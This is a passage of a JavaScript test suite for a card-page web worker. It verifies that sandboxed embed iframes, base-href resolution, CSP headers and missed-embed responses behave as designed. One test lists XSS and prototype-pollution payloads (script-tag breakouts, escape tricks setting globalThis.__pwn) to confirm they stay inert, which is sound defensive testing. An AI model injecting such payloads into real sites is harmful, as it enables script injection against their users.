const EMBED_HEADERS = [['cache-control', 'public, max-age=60'], ['content-security-policy', EMBED_DOCUMENT_POLICY], ['content-type', 'text/html; charset=utf-8'],
  ['cross-origin-resource-policy', 'same-origin'], ['vary', 'Sec-Fetch-Dest'], ['x-content-type-options', 'nosniff'], ['x-robots-tag', 'noindex']];

test('enforced: an embed is its own document — same sandbox, a same-origin address, the srcdoc\'s document plus one base element, its own policy', async () => {
  assert.equal(EMBED_DOCUMENT_POLICY, 'sandbox allow-scripts');
  for (const [path, base, query, pageAt] of [['/embedded', '/embedded/', '', '/embedded'], ['/onback', '/onback/', '', '/onback'],
    [`/_preview/${'d'.repeat(32)}`, `/_preview/${'d'.repeat(32)}/`, '', `/_preview/${'d'.repeat(32)}`],
    [`/longembedded?w=${EMBED_WINDOW}`, '/longembedded/', `?w=${EMBED_WINDOW}`, '/longembedded']]) {
    const off = await (await ask(path)).text();
    const offFrames = framesOf(off);
    assert.equal(offFrames.length, 1, `${path}: the fixture holds one embed`);
    assert.ok(offFrames[0].srcdoc && !offFrames[0].src, `${path}: off, the embed is a srcdoc frame`);
    assert.ok(!off.includes('/_embed/'), `${path}: off, no embed address`);
    for (const stage of ['enforce']) {
      const r = await ask(path, { CARDS_PAGE_CSP: stage });
      const on = await r.text();
      const [f] = framesOf(on);
      assert.match(f.src, new RegExp(`^${base.replace(/[/.?]/g, '\\$&')}_embed/[0-9a-f]{64}${query.replace('?', '\\?')}$`), `${path} ${stage}: ${f.src}`);
      assert.equal(f.srcdoc, undefined);
      assert.match(f.attrs, /^ sandbox="allow-scripts" src="/, `${path}: the sandbox is the one token, as before`);
      assert.ok(!/allow-same-origin/.test(on));
      // every other byte of the page is the page served with the setting off
      assert.equal(on, off.replace(` srcdoc="${offFrames[0].srcdoc}"`, ` src="${f.src}"`), `${path} ${stage}: the page changed elsewhere`);
      // the address answers with the document the srcdoc held — the author's bytes unchanged — plus exactly one
      // `<base href>` naming the page (r2: so its relative addresses resolve as in the srcdoc), under its own policy
      const doc = await ask(f.src, { CARDS_PAGE_CSP: stage });
      assert.equal(doc.status, 200, `${path} ${stage}: ${f.src}`);
      assert.equal(await doc.text(), fromSrcdoc(offFrames[0].srcdoc).replace(DOC_HEAD, `${DOC_HEAD}<base href="${pageAt}">`), `${path} ${stage}: not the srcdoc's document plus one base element`);
      const preview = path.startsWith('/_preview/');
      assert.deepEqual([...doc.headers], preview
        ? EMBED_HEADERS.map(([k, v]) => [k, k === 'cache-control' ? 'no-store' : k === 'x-robots-tag' ? 'noindex, nofollow' : v])
        : EMBED_HEADERS, `${path}: the embed document's headers`);
      const head = await ask(f.src, { CARDS_PAGE_CSP: stage }, { method: 'HEAD' });
      assert.equal(head.status, 200);
    }
  }
});

test('enforced, a person\'s own domain and the root card: the address is under the page\'s own base, and answers there', async () => {
  const seed = { aster: WITH_EMBED, 'vanity:own.example': 'aster', 'vanityof:aster:0': 'own.example', 'vanitybind:aster:0:own.example': '1' };
  const env = { CARDS: { get: async (k) => seed[k] ?? null, async getWithMetadata(k) { return { value: await this.get(k), metadata: null }; } }, ...ON, PREVIEW: 'false' };
  const page = await (await worker.fetch(new Request('https://own.example/'), env)).text();
  const [f] = framesOf(page);
  assert.match(f.src, /^\/_embed\/[0-9a-f]{64}$/);
  const doc = await worker.fetch(new Request(`https://own.example${f.src}`, asFrame(f.src)), env);
  assert.equal(doc.status, 200);
  assert.equal(doc.headers.get('content-security-policy'), EMBED_DOCUMENT_POLICY);
  // the same document under /<handle>/ on the domain (the root card's spelling) answers too
  assert.equal((await worker.fetch(new Request(`https://own.example/aster${f.src}`, asFrame(f.src)), env)).status, 200);
});

test('the embed address cannot be made to answer with anything but an embed tile of the file it names', async () => {
  const src = framesOf(await (await ask('/embedded', ON)).text())[0].src;
  const theirs = framesOf(await (await ask('/other', ON)).text())[0].src;
  const unknown = await ask('/embedded/nope', ON);
  const unknownBody = await unknown.text();
  // an embed address the file does not hold: the empty document, in every stage (the default's review)
  const missOn = async (path, why) => {
    for (const [stage, s] of EVERY_STAGE) await isEmptyEmbed(await ask(path, s), `${why}, ${stage}: ${path}`);
  };
  // a path that is not an embed address at all: the unknown path it always was
  const unknownOn = async (path, why) => {
    const r = await ask(path, ON);
    assert.equal(r.status, unknown.status, `${why}: ${path}`);
    assert.deepEqual([...r.headers], [...unknown.headers], `${why}: ${path}`);
    assert.equal(await r.text(), unknownBody, `${why}: ${path}`);
  };
  const hexOf = (s) => createHash('sha256').update(s, 'utf8').digest('hex');
  await missOn(theirs.replace('/other/', '/embedded/'), 'somebody else\'s embed under this handle');
  await missOn(`/embedded/_embed/${hexOf('<script>alert(1)</script>')}`, 'arbitrary HTML');
  await missOn(`/embedded/_embed/${hexOf(await (await ask('/embedded')).text())}`, 'the page itself');
  await missOn(`/plain/_embed/${src.split('/').pop()}`, 'this embed under a handle that has none');
  await missOn(`/nobody/_embed/${src.split('/').pop()}`, 'a handle with no file');
  await unknownOn(src.toUpperCase().replace('/EMBEDDED/_EMBED/', '/embedded/_embed/'), 'an upper-case hash');
  await unknownOn(`${src}/`, 'a trailing slash');
  // the word "embed", a link address and an `embed kind=slider` are no embed tile: no frame, no document
  assert.deepEqual(await embedDocuments(parseCard(wordsNamingEmbed(ON_DEMAND_TILES + 5)), () => ''), []);
  // a window that does not hold the embed does not answer for it, nor does a window that does not exist
  const longSrc = framesOf(await (await ask(`/longembedded?w=${EMBED_WINDOW}`, ON)).text())[0].src;
  assert.equal((await ask(longSrc, ON)).status, 200);
  for (const q of ['', '?w=1', `?w=${EMBED_WINDOW + 1}`, '?w=0', '?w=x']) await missOn(longSrc.replace(/\?.*$/, '') + q, `the long file's embed at ${q || 'no window'}`);
  // a preview's embed: under its own preview only (another preview, one that is gone, a hash it does not hold)
  const pv = framesOf(await (await ask(`/_preview/${'d'.repeat(32)}`, ON)).text())[0].src;
  assert.equal((await ask(pv, ON)).status, 200);
  for (const p of [pv.replace('d'.repeat(32), 'c'.repeat(32)), pv.replace('d'.repeat(32), 'e'.repeat(32)), pv.replace(/[0-9a-f]{64}$/, '0'.repeat(64))]) await missOn(p, 'not this preview\'s embed');
});

// ── r2: the second review's three findings, each with the review's own input ─────────────────────
// what renderEmbedHtml writes first in every embed document (card-render.mjs)
const DOC_HEAD = '<!doctype html><meta charset="utf-8">';
/** the base a document's relative addresses resolve against: its first <base href>, else its own address */
const baseOf = (body, docUrl) => { const m = /<base\b[^>]*?\shref="([^"]*)"/i.exec(body); return m ? new URL(unescape(m[1]), docUrl).href : docUrl; };
// path-, dot-, query-, fragment-, empty-, scheme- and root-relative, and absolute
const RELATIVE = ['aster/favicon.ico', DECK_JS_PATH.slice(1), '#x', '?q=1', '', './x', '../aster/favicon.ico', '//other.example/x', '/aster/favicon.ico', 'https://pictures.example/y.png'];

test('r2 finding 1: an embed\'s relative addresses resolve as they did in its srcdoc — the review\'s `<img src="aster/favicon.ico">` at /aster', async () => {
  const seed = { aster: RELATIVE_EMBED(DECK_JS_PATH), 'vanity:own.example': 'aster', 'vanityof:aster:0': 'own.example', 'vanitybind:aster:0:own.example': '1' };
  const own = { CARDS: { get: async (k) => seed[k] ?? null, async getWithMetadata(k) { return { value: await this.get(k), metadata: null }; } }, PREVIEW: 'false' };
  const pv = `/_preview/${'f'.repeat(32)}`;
  const shapes = [
    // [what, the page's address, its base element's address, ask(address, settings)]
    ['a shared host', 'http://localhost/aster', '/aster', (u, s) => worker.fetch(new Request(u, asFrame(u)), { CARDS: store(), ...s })],
    ['a preview', `http://localhost${pv}`, pv, (u, s) => worker.fetch(new Request(u, asFrame(u)), { CARDS: store(), ...s })],
    ['a person\'s own domain', 'https://own.example/', '/', (u, s) => worker.fetch(new Request(u, asFrame(u)), { ...own, ...s })],
  ];
  let resolved = 0;
  for (const [what, pageUrl, pageBase, get] of shapes) {
    const offFrames = framesOf(await (await get(pageUrl, OFF)).text());
    assert.equal(offFrames.length, 2, `${what}: two embeds`);
    for (const stage of ['enforce']) {
      const onFrames = framesOf(await (await get(pageUrl, { CARDS_PAGE_CSP: stage })).text());
      for (const [i, f] of onFrames.entries()) {
        const docUrl = new URL(f.src, pageUrl).href;
        const r = await get(docUrl, { CARDS_PAGE_CSP: stage });
        assert.equal(r.status, 200, `${what} ${stage}: ${docUrl}`);
        const body = await r.text();
        // off, the srcdoc document resolves against the page's address (a srcdoc's base is its parent's)
        for (const ref of RELATIVE) {
          assert.equal(new URL(ref, baseOf(body, docUrl)).href, new URL(ref, pageUrl).href, `${what} ${stage}: ${JSON.stringify(ref)} resolves elsewhere than in the srcdoc`);
          resolved += 1;
        }
        // the claim, pinned: the srcdoc's document, author's bytes untouched, plus exactly one base element
        // (an address only: no target, so an author's own `<base target>` and every link's target act as before)
        const srcdocDoc = fromSrcdoc(offFrames[i].srcdoc);
        assert.ok(srcdocDoc.startsWith(DOC_HEAD), `${what}: the document starts as the renderer writes it`);
        assert.equal(body, srcdocDoc.replace(DOC_HEAD, `${DOC_HEAD}<base href="${pageBase}">`), `${what} ${stage}: not the srcdoc's document plus one base element`);
      }
      // what the review measured: the picture and the deck's script, at the addresses they resolve to, answer
      if (what === 'a shared host') {
        const [pic, deck] = onFrames.map((f) => new URL(f.src, pageUrl).href);
        const picBody = await (await get(pic, { CARDS_PAGE_CSP: stage })).text();
        assert.equal((await get(new URL('aster/favicon.ico', baseOf(picBody, pic)).href, { CARDS_PAGE_CSP: stage })).status, 200, `${stage}: the picture`);
        const deckBody = await (await get(deck, { CARDS_PAGE_CSP: stage })).text();
        assert.equal((await get(new URL(DECK_JS_PATH.slice(1), baseOf(deckBody, deck)).href, { CARDS_PAGE_CSP: stage })).status, 200, `${stage}: the deck script`);
      }
    }
  }
  console.log(`# cardtile page csp r2: ${resolved} relative addresses resolved as in the srcdoc`);
});

test('r2 finding 2: a Cards page framed by another site still shows its embeds — the embed document restricts its ancestors no more than the page does', async () => {
  const ancestors = (r) => [r.headers.get(ENFORCED), r.headers.get(REPORTED)].filter(Boolean)
    .flatMap((p) => p.split(';').map((d) => d.trim()).filter((d) => /^frame-ancestors\b/i.test(d)));
  for (const path of ['/embedded', `/_preview/${'d'.repeat(32)}`]) {
    for (const stage of ['enforce']) {
      const page = await ask(path, { CARDS_PAGE_CSP: stage });
      const src = framesOf(await page.text())[0].src;
      const doc = await ask(src, { CARDS_PAGE_CSP: stage });
      assert.equal(doc.status, 200);
      // the page may be framed by any site (cardtile-page-csp.mjs): no frame-ancestors, no X-Frame-Options…
      assert.deepEqual(ancestors(page), [], `${path} ${stage}: the page itself`);
      assert.equal(page.headers.get('x-frame-options'), null);
      // …and so may its embed's document, or a page framed elsewhere would lose its embeds (ancestors are ALL checked)
      assert.deepEqual(ancestors(doc), [], `${path} ${stage}: the embed document restricts its ancestors`);
      assert.equal(doc.headers.get('x-frame-options'), null);
      // what isolates it is unchanged: an opaque origin by its own sandbox, the one token
      assert.equal(doc.headers.get(ENFORCED), 'sandbox allow-scripts', `${path} ${stage}`);
    }
  }
});

// r2 finding 3 asked a missed embed address to be the "no card" page in the visitor's language. The default's
// review saw that page drawn inside an embed's box, and it is now the empty document: it has no words, so no
// language — whatever the visitor's language or the host they asked, it is the same bytes.
test('r2 finding 3, superseded: a missed embed address is the same empty document in every language and on every host', async () => {
  const env = { CARDS: store(), ...ON, CARD_CANONICAL_HOST: 'reef.cards' };
  const miss = `/aster/_embed/${'0'.repeat(64)}`;
  for (const [how, u, init] of [['?lang=ja', `https://reef.cards${miss}?lang=ja`, {}], ['Accept-Language: ja', `https://reef.cards${miss}`, { headers: { 'accept-language': 'ja' } }],
    ['a window', `https://reef.cards${miss}?w=2`, {}], ['plain', `https://reef.cards${miss}`, {}]]) {
    await isEmptyEmbed(await worker.fetch(new Request(u, asFrame(u, init)), env), how);
  }
});

// ── r3: the closing review's finding — an author's own `<base href>` ─────────────────────────────
// In the srcdoc, an author's base is honoured: the first base element WITH an href, in tree order (a base in a
// template, an <svg> or a <noscript> is none), parsed against the srcdoc's fallback base — the page's address.
// Measured in Chromium and WebKit on the srcdoc page (lane receipt): `app/` on /x/aster → /x/app/, `` → the
// page, a base in a template, an svg or a noscript → the page, `<base target>` then `<base href>` → the second.
// `pick` is the href the browser picks in the srcdoc (null: none, the page's address is the base);
// `inject` is what the served document adds after its head: 'none', or the href of the one base element.
const relativeTo = (href) => (page, pageUrl, docUrl) => {
  const u = new URL(href, pageUrl);
  return u.href === new URL(href, docUrl).href ? 'none' : `${u.pathname}${u.search}${u.hash}`;
};
const AUTHOR_BASES = [
  ['the review\'s input: an absolute base of the author\'s own', '<base href="http://localhost:37231/app/"><b id="t">loading</b><script src="widget.js"></script>', 'http://localhost:37231/app/', () => 'none'],
  ['`<base href` inside a comment', '<!-- <base href="http://elsewhere.example/"> --><img src="aster/favicon.ico">', null, (page) => page],
  ['`<base href` inside a script string', '<script>var s = \'<base href="http://elsewhere.example/">\';</script><img src="aster/favicon.ico">', null, (page) => page],
  ['tag names that begin with base', '<baseline href="http://elsewhere.example/">x</baseline><basefont href="http://elsewhere.example/"><base-x href="http://elsewhere.example/"></base-x>', null, (page) => page],
  ['`<base href` inside an attribute value, a style and a textarea', '<a title=\'<base href="http://elsewhere.example/">\'>t</a><style>/* <base href="http://elsewhere.example/"> */</style><textarea><base href="http://elsewhere.example/"></textarea>', null, (page) => page],
  ['a base in a template, an svg and a noscript', '<template><base href="/tpl/"></template><svg><base href="/svg/"></base></svg><noscript><base href="/ns/"></noscript><img src="aster/favicon.ico">', null, (page) => page],
  ['a base with a target and no href', '<base target="_self"><a href="aster">a</a>', null, (page) => page],
  ['a target-only base, then one with an href', '<base target="_self"><base href="https://cdn.example/app/">', 'https://cdn.example/app/', () => 'none'],
  ['a root-relative author base', '<base href="/app/"><script src="widget.js"></script>', '/app/', () => 'none'],
  ['a scheme-relative author base', '<base href="//cdn.example/app/">', '//cdn.example/app/', () => 'none'],
  ['an author base after the first content', '<b>x</b><base href="/late/">', '/late/', () => 'none'],
  ['upper case, unquoted', '<BASE HREF=https://cdn.example/up/>', 'https://cdn.example/up/', () => 'none'],
  // relative to the page: the one base added is the author's, resolved against the page as in the srcdoc —
  // unless it comes out the same at the embed's address (`../app/` from `/` and from `/_embed/<hash>`)
  ['a path-relative author base', '<base href="app/"><script src="widget.js"></script>', 'app/', relativeTo('app/')],
  ['a dot-dot author base', '<base href="../app/">', '../app/', relativeTo('../app/')],
  ['an empty author base', '<base href="">', '', (page, pageUrl, docUrl) => page],
  ['a query-only author base', '<base href="?v=2">', '?v=2', relativeTo('?v=2')],
  ['a path-relative author base with a character reference', '<base href="a&amp;b/">', 'a&b/', (...a) => relativeTo('a&b/')(...a).replace(/&/g, '&amp;')],
];

test('r3: an author\'s own `<base href>` is honoured as in its srcdoc — the review\'s widget at /aster loads widget.js from the author\'s base', async () => {
  const shapes = [
    // [what, the page's address, the page as its base element names it, the store, the extra settings]
    ['a shared host', 'http://localhost/aster', '/aster', (md) => ({ aster: md }), {}],
    ['a person\'s own domain', 'https://own.example/', '/', (md) => ({ aster: md, 'vanity:own.example': 'aster', 'vanityof:aster:0': 'own.example', 'vanitybind:aster:0:own.example': '1' }), { PREVIEW: 'false' }],
    ['a preview', `http://localhost/_preview/${'e'.repeat(32)}`, `/_preview/${'e'.repeat(32)}`, (md) => ({ [`_preview:${'e'.repeat(32)}`]: md }), {}],
  ];
  let checked = 0;
  for (const [what, html, pick, inject] of AUTHOR_BASES) {
    const md = `---\ntitle: An author's own base\nview: wall\n---\n\n## grid\n\n- [ ] %% card: embed %% ${html}\n`;
    for (const [where, pageUrl, pageBase, seedOf, extra] of shapes) {
      const seed = seedOf(md);
      const get = (u, s) => worker.fetch(new Request(u, asFrame(u)), { CARDS: { get: async (k) => seed[k] ?? null, async getWithMetadata(k) { return { value: await this.get(k), metadata: null }; } }, ...extra, ...s });
      const [off] = framesOf(await (await get(pageUrl, OFF)).text());
      const srcdocDoc = fromSrcdoc(off.srcdoc);
      assert.ok(srcdocDoc.endsWith(html), `${what}, ${where}: the author's HTML is the end of the srcdoc document`);
      // where the srcdoc's relative addresses go (the browser's answer, above)
      const srcdocBase = pick == null ? new URL(pageUrl).href : new URL(pick, pageUrl).href;
      for (const stage of ['enforce']) {
        const [f] = framesOf(await (await get(pageUrl, { CARDS_PAGE_CSP: stage })).text());
        const docUrl = new URL(f.src, pageUrl).href;
        const want = inject(pageBase, pageUrl, docUrl);
        const r = await get(docUrl, { CARDS_PAGE_CSP: stage });
        assert.equal(r.status, 200, `${what}, ${where} ${stage}`);
        const body = await r.text();
        // exactly the author's document, or it plus one base element right after the renderer's head
        const added = body === srcdocDoc ? 'none' : (body.startsWith(`${DOC_HEAD}<base href="`) && /^<base href="([^"]*)">/.exec(body.slice(DOC_HEAD.length)) || [])[1];
        assert.ok(added === 'none' || body === srcdocDoc.replace(DOC_HEAD, `${DOC_HEAD}<base href="${added}">`), `${what}, ${where} ${stage}: not the srcdoc's document (plus one base element)`);
        assert.equal(added, want, `${what}, ${where} ${stage}: the base element added`);
        // the base the served document resolves against: the one added (it is first), else the author's own
        const servedBase = added === 'none' ? new URL(pick, docUrl).href : new URL(unescape(added), docUrl).href;
        assert.equal(servedBase, srcdocBase, `${what}, ${where} ${stage}: resolves elsewhere than in the srcdoc`);
        if (html.includes('widget.js')) assert.equal(new URL('widget.js', servedBase).href, new URL('widget.js', srcdocBase).href);
        checked += 1;
      }
    }
  }
  console.log(`# cardtile page csp r3: ${checked} author-base documents resolve as in the srcdoc`);
});

// r4: the characters the built-in searches examine while `f` runs — String indexOf/includes/lastIndexOf/
// startsWith and RegExp exec (which test, replace, search and split go through once exec is replaced).
// Deterministic, unlike a clock on a loaded host; the prototypes are restored before it returns.
function searchedChars(f) {
  const SP = String.prototype;
  const RP = RegExp.prototype;
  const orig = { indexOf: SP.indexOf, includes: SP.includes, lastIndexOf: SP.lastIndexOf, startsWith: SP.startsWith, exec: RP.exec };
  let work = 0;
  const found = (len, from, r, x) => { const at = Math.max(0, Math.min(Number(from) || 0, len)); work += r >= 0 ? r + String(x).length - at : len - at; };
  SP.indexOf = function (x, from) { const r = orig.indexOf.call(this, x, from); found(this.length, from, r, x); return r; };
  SP.includes = function (x, from) { const r = orig.indexOf.call(this, x, from); found(this.length, from, r, x); return r >= 0; };
  SP.lastIndexOf = function (...a) { work += this.length; return orig.lastIndexOf.apply(this, a); };
  SP.startsWith = function (x, pos) { work += String(x).length; return orig.startsWith.call(this, x, pos); };
  RP.exec = function (str) {
    const t = String(str);
    const at = this.global || this.sticky ? this.lastIndex : 0;
    const m = orig.exec.call(this, t);
    work += m ? m.index + Math.max(1, m[0].length) - at : t.length - at;
    return m;
  };
  try { f(); } finally { Object.assign(SP, { indexOf: orig.indexOf, includes: orig.includes, lastIndexOf: orig.lastIndexOf, startsWith: orig.startsWith }); RP.exec = orig.exec; }
  return work;
}

test('r4: finding the author\'s base is one pass over the document — twice the markup is at most about twice the reading, for every shape it reads', () => {
  // d4f9d88 searched for `-->` and for `--!>` separately from every comment: the one that is not there was
  // looked for to the end of the document, once per comment (the review: 300 KB of ordinary SSR markup, 3 s).
  const RAW = ['script', 'style', 'textarea', 'title', 'xmp', 'iframe', 'noembed', 'noframes', 'noscript'];
  const shapes = {
    'empty comments (the review\'s)': '<!---->',
    'SSR markup (the review\'s)': '<li><!--[--><span>item</span><!--]--></li>',
    'comments that end `--!>`': '<!-- a --!>',
    '`<!-->` and `<!--->`': '<!--><!--->',
    'bogus comments': '<!x><?x></ x>',
    'doctypes': '<!doctype html>',
    '`<` as text': 'a < b <3 ',
    'attributes, quoted and not': `<p a="1" b='2' c=3 d e="<base href=x>">`,
    'end tags with attributes': '</p a="1">',
    'bases with no href': '<base target=_self>',
    'templates': '<template><base href=x></template>',
    'svg': '<svg><path d="x"/><base href=x></svg>',
    'math': '<math><mi>x</mi></math>',
    'svg left by an HTML tag': '<svg><b>x</b>',
    'CDATA in svg': '<svg><![CDATA[<base href=x>]]></svg>',
    ...Object.fromEntries(RAW.map((t) => [`<${t}> with a near-miss end tag`, `<${t}><base href=x></${t}x></${t}>`])),
    ...Object.fromEntries(RAW.map((t) => [`<${t}> holding a comment opener`, `<${t}><!--</${t}>`])),
  };
  const read = (markup) => searchedChars(() => embedDocumentBody(`${EMBED_DOC_HEAD}${markup}`, '/aster', 'https://cards.example/aster/_embed/abc'));
  for (const [what, unit] of Object.entries(shapes)) {
    const once = unit.repeat(Math.ceil(20000 / unit.length));
    const twice = once + once;
    const a = read(once);
    const b = read(twice);
    assert.ok(a >= once.length, `${what}: the count saw ${a} characters of ${once.length} — it is not counting`);
    assert.ok(b <= 2.2 * a, `${what}: twice the markup was ${(b / a).toFixed(2)}× the reading (${a} → ${b} characters searched)`);
    assert.ok(b <= 8 * twice.length, `${what}: ${(b / twice.length).toFixed(1)} characters searched per character of the document`);
  }
});

// The default's review, finding 2, on the whole grid: an embed address answers the SAME in every stage of the
// setting (so moving it — back to "off", or to the default — never changes what a loaded page's frame gets), and
// it is never the rendered "no card" page. Each answer is the empty document, or — where the address does not
// reach the embed route at all (a host with no Cards on it, a person's own domain whose file is gone, a method the
// route does not take) — exactly what the same path with `_embee` answers there.
test('the embed address answers alike in every stage of the setting, on every stage and host of the grid, and is never the rendered "no card" page', async () => {
  const hex = 'a'.repeat(64);
  const pairs = [[`/aster/_embed/${hex}`, `/aster/_embee/${hex}`], [`/_embed/${hex}`, `/_embee/${hex}`], [`/aster/_embed/${hex}?w=1`, `/aster/_embee/${hex}?w=1`],
    [`/_preview/${GRID_PREVIEW}/_embed/${hex}`, `/_preview/${GRID_PREVIEW}/_embee/${hex}`], [`/feelreef/_embed/${hex}`, `/feelreef/_embee/${hex}`]];
  const kinds = new Map();
  const bad = [];
  const isEmpty = (a) => a.status === 404 && JSON.stringify(a.headers) === JSON.stringify(EMPTY_EMBED_HEADERS);
  // the page's own policy header follows the stage on a page (an unknown path's "no card" page carries it); the
  // embed document's policy is its own and is compared
  const noPagePolicy = (a) => ({ ...a, headers: a.headers.filter(([k, v]) => k !== REPORTED && !(k === ENFORCED && v !== EMBED_DOCUMENT_POLICY)) });
  // `/_embed/<hash>` at a host's root is an embed address only on a person's own domain (a one-card host): a shared
  // host's pages name `/<handle>/_embed/<hash>`, so there it is an unknown path, as any other
  const written = (host, path) => !path.startsWith('/_embed/') || host === 'own.example';
  await atFixedClock(async () => {
    for (const stage of Object.keys(GRID_STAGES)) for (const host of GRID_HOSTS) for (const [path, sibling] of pairs) for (const init of [{}, { method: 'HEAD' }, { method: 'POST', body: 'x' }].map((i) => asFrame(path, i))) {
      const key = `${stage} ${host} ${init.method || 'GET'} ${path}`;
      const answers = [];
      for (const [, s] of EVERY_STAGE) answers.push(await answerOf(worker, { stage, host, path, init }, s));
      for (const [i, a] of answers.entries()) { const d = answerDiff(noPagePolicy(a), noPagePolicy(answers[0])); if (d) bad.push(`${key}, ${EVERY_STAGE[i][0]}: ${d}`); }
      const got = answers[0];
      let kind;
      if (isEmpty(got)) kind = 'the empty document';
      else {
        const asked = await answerOf(worker, { stage, host, path: sibling, init }, ON);
        // a redirect names the path it was asked: that one header is the sibling's path, and is read as ours
        const want = { ...asked, headers: asked.headers.map(([k, v]) => [k, k === 'location' ? v.replace('/_embee/', '/_embed/') : v]) };
        const d = answerDiff(got, want);
        if (d) bad.push(`${key}: neither the empty document nor the unknown path: ${d}`);
        kind = `the unknown path: ${got.status}, ${got.bytes} bytes${written(host, path) ? '' : ' (not an embed address on this host)'}`;
        if (got.status === 404 && got.bytes > 1000 && written(host, path)) bad.push(`${key}: the rendered "no card" page`);
      }
      kinds.set(kind, (kinds.get(kind) || 0) + 1);
    }
  });
  console.log(`# embed addresses on the grid, every stage of the setting: ${[...kinds].map(([k, n]) => `${n} × ${k}`).join(' | ')}`);
  assert.deepEqual(bad.slice(0, 10), [], `${bad.length} mismatches`);
  assert.ok((kinds.get('the empty document') || 0) > 0, 'CONTROL: no address reached the embed route');
  // and a page with an embed is the srcdoc page, off and by default
  for (const s of [OFF, {}]) {
    const page = await (await ask('/embedded', s)).text();
    assert.ok(/<iframe sandbox="allow-scripts" srcdoc="/.test(page) && !page.includes('/_embed/'));
  }
});

test('r1: the boot line under the review\'s adversarial values — hashed, and running it runs nothing but data', async () => {
  const payloads = ['";globalThis.__pwn=1;//', '</script><script>globalThis.__pwn=2</script>', '\u2028globalThis.__pwn=3\u2029', '\\u0022;globalThis.__pwn=4;//', '\\u003c/script\\u003e',
    '\\\\";globalThis.__pwn=5;//', '\u0000\r', 'a'.repeat(200000), '\ud800', '"};window.__x={"__proto__":{"pwn":1}};//'];
  for (const [i, v] of payloads.entries()) {
    const md = `---\nview: stack\nback: ${v}\n---\n\n## grid\n\n- [ ] %% card: text %% safe\n`;
    const r = await worker.fetch(new Request('http://localhost/attack'), { CARDS: { get: async (k) => (k === 'attack' ? md : null), async getWithMetadata(k) { return { value: await this.get(k), metadata: null }; } }, ...ON });
    const page = await r.text();
    const boot = bootScriptOf(page);
    assert.ok(boot, `payload ${i}: no boot line`);
    assert.ok(directives(r.headers.get(ENFORCED))['script-src'].includes(sha(boot)), `payload ${i}: the boot line is not hashed`);
    const ctx = { window: {} };
    vm.runInNewContext(boot, ctx, { timeout: 1000 });
    assert.equal(ctx.__pwn, undefined, `payload ${i}`);
    assert.ok(!('pwn' in Object.getPrototypeOf(ctx.window)), `payload ${i}`);
    assert.deepEqual(refusals(page, r.headers.get(ENFORCED)), [], `payload ${i}`);
  }
  for (const [code, data] of [['window.__x="";alert(1);', false], ['window.__x={"x":(alert(1))};', false], ['window.__x="\\u0022;alert(1);//";', true], ['window.__proto__={};', false]]) {
    assert.equal(isBootData(code), data, code);
  }
});

// ── the default's review: embeds stay srcdoc until "enforce"; an embed address never draws a "no card" page ──
// What an embed address answers when the file no longer holds its document: an empty document, under the
// embed document's own policy, never cached (a revert answers at once). Never the "no card" page — that
// page, drawn inside an embed's box, is what the review saw (cardtile-embed-document.mjs embedMissResponse).
const EMPTY_EMBED_HEADERS = [['cache-control', 'no-store'], ['content-security-policy', EMBED_DOCUMENT_POLICY], ['content-type', 'text/html; charset=utf-8'],
  ['cross-origin-resource-policy', 'same-origin'], ['vary', 'Sec-Fetch-Dest'], ['x-content-type-options', 'nosniff'], ['x-robots-tag', 'noindex, nofollow']];
async function isEmptyEmbed(r, what) {
  assert.equal(r.status, 404, `${what}: status`);
  assert.deepEqual([...r.headers], EMPTY_EMBED_HEADERS, `${what}: headers`);
  const body = await r.text();
  assert.ok(!/Nothing here|<main|feelreef/i.test(body), `${what}: the "no card" page in the embed's box`);
  assert.equal(body, EMBED_DOC_HEAD, `${what}: not the empty document`);
}
/** a store the test can edit between two requests, as an owner does while a page is open */
const editable = (seed) => {
  const s = { ...seed };
  return { seed: s, CARDS: { get: async (k) => s[k] ?? null, async getWithMetadata(k) { return { value: await this.get(k), metadata: null }; } } };
};
const PV_EDIT = '7'.repeat(32);
const OWN_SEED = (handle, md) => ({ [handle]: md, 'vanity:own.example': handle, [`vanityof:${handle}:0`]: 'own.example', [`vanitybind:${handle}:0:own.example`]: '1' });
// [what, the page's address, the store, the key the owner edits, the deployment's settings]
const EDIT_SHAPES = [
  ['a shared host', 'http://localhost/edited', { edited: WITH_EMBED }, 'edited', {}],
  ['a person\'s own domain', 'https://own.example/', OWN_SEED('edited', WITH_EMBED), 'edited', { PREVIEW: 'false' }],
  ['the root card', 'https://reef.cards/', { feelreef: WITH_EMBED }, 'feelreef', { CARD_CANONICAL_HOST: 'reef.cards', PREVIEW: 'false' }],
  ['a preview', `http://localhost/_preview/${PV_EDIT}`, { [`_preview:${PV_EDIT}`]: WITH_EMBED }, `_preview:${PV_EDIT}`, {}],
  ['a long file\'s window', `http://localhost/longedit?w=${EMBED_WINDOW}`, { longedit: CARDS.longembedded }, 'longedit', {}],
];
// every stage a Worker can be in when the frame's address is asked
const EVERY_STAGE = [['enforce', ON], ['off', OFF], ['unset (report-only)', {}], ['"report-only"', { CARDS_PAGE_CSP: 'report-only' }]];

test('the default\'s review, finding 1: an embed edited after its page was loaded — its address answers an empty document in every stage, never the "no card" page', async () => {
  const edits = [
    ['the embed\'s own HTML', (md) => md.replace('</script>\n', ';0</script>\n')],
    ['the theme (every embed\'s hash)', (md) => md.replace('---\n', '---\ntheme: dark\n')],
    ['the accent (every embed\'s hash)', (md) => md.replace('---\n', '---\naccent: "#0a7d5a"\n')],
    ['the embed taken out', (md) => md.replace(/- \[ \] %% card: embed[^\n]*\n/, '')],
    ['the file stopped', null],
  ];
  let asked = 0;
  for (const [where, pageUrl, seed, key, extra] of EDIT_SHAPES) {
    for (const [what, edit] of edits) {
      const st = editable(seed);
      const get = (u, s, init = {}) => worker.fetch(new Request(u, asFrame(u, init)), { CARDS: st.CARDS, ...extra, ...s });
      // the page, loaded under "enforce" before the edit: its embed is its own document
      const frames = framesOf(await (await get(pageUrl, ON)).text());
      assert.equal(frames.length, 1, `${where}: one embed`);
      const docUrl = new URL(frames[0].src, pageUrl).href;
      assert.equal((await get(docUrl, ON)).status, 200, `CONTROL ${where}: before the edit its address answers`);
      // the owner edits (or the file is stopped); the open tab's lazy frame then asks its address
      if (edit) { st.seed[key] = edit(st.seed[key]); assert.notEqual(st.seed[key], seed[key], `${where} ${what}: the edit edited nothing`); }
      else if (key.startsWith('_preview:')) delete st.seed[key];
      else st.seed[`stop:${key}`] = '1';
      for (const [stage, s] of EVERY_STAGE) {
        if (!edit && where === 'a person\'s own domain') {
          // a stopped file on a person's own domain: every address there answers as an unbound domain does (the
          // binding is not public once the file is gone — card-worker.mjs), the embed's too: the small 404, no page of ours
          const unbound = await get('https://own.example/wp-login.php', s);
